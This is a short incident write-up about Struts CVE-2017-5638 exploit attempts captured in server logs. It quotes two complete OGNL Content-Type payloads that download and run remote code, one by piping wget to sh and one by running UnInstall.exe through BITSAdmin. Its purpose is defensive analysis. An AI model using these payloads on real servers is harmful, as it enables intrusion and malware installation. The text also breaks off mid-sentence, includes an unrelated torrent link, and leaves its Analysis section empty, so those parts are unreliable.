# Struts Exploit

## Summary
While looking through the logs of one of our servers, we encountered these entries, spaced one second apart.

I downloaded the binaries from the urls listed in the exploit attempts. I downloaded two files, one from each of the drive-by exploit attempts. The first URL was targeted towards Linux Based systems, and the second was targeting Windows based systems. They are both attempting to exploit a recently discovered vulnerability in the Apache Struts MVC framework. 

Brief Description of Apache Struts Vulnerability -- CVE-2017-5638:
Written in Java, leverages a vulnerability in the Jakarta Multipart parser. When an invalid value is placed in the Content-Type header, an exception is thrown. The exception is used to display the error to the user. Attackers exploit this vulnerability to escape the data scope into the execution scope through the Content-Type Header. 67% of the attacks come from China, 17% from the US, 6% from Taiwan, and 5% from Hong Kong.
https://www.impervia.com/blog/2017/03/cve-2017-5638-new-remote-code-execution-rce-vulnerability-in-apache-struts-2/


The IP we recorded was from China, and has a risk score of 5. As of today: March 26, 2017: It has an AS number of 4134
https://www.dshield.org/ipinfo.html?ip=220.191.231.222
The attempts were executed at 06:19:02 UTC, from the locale of the origin IP address, was 14:00 CST.

This ip address sent two packets, which would download from two different ip addresses, embedded in the modified Content-Type header field. The first was targeted towards systems built on *nix based servers, and the second was targeted towards systems built on Windows based servers

I downloaded the `a` script from the ip address 65.254.63.20, and received a shell script. The first thing it does is to add the present working directory for instance to the path.

The second contains a binary named `UnInstall.exe`. The 
https://thepiratebay.org/torrent/16135858/The_Elder_Scrolls_V_Skyrim_Special_Edition-CODEX

## Log Entries
```
---BEGIN---
    Wed Mar 22 2017 06:19:02 GMT+0000 (UTC)
    New Connection 220.191.231.222 -> ###.###.###.###
    User Agent: Mozilla/5.0
    Requested Resource: /
    Request Method: GET
    Accept: undefined
    Content Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://65.254.63.20/a|sh ; rm -rf a ; curl -O http://65.254.63.20/a ; sh a ').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
    Content Length: undefined
---BEGIN---
    Wed Mar 22 2017 06:19:02 GMT+0000 (UTC)
    New Connection 220.191.231.222 -> ###.###.###.###
    User Agent: Mozilla/5.0
    Requested Resource: /
    Request Method: GET
    Accept: undefined
    Content Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='BITSAdmin.exe /Transfer JOB http://82.165.129.119/UnInstall.exe %TEMP%/UnInstall.exe & %TEMP%/UnInstall.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
    Content Length: undefined
```

## Analysis
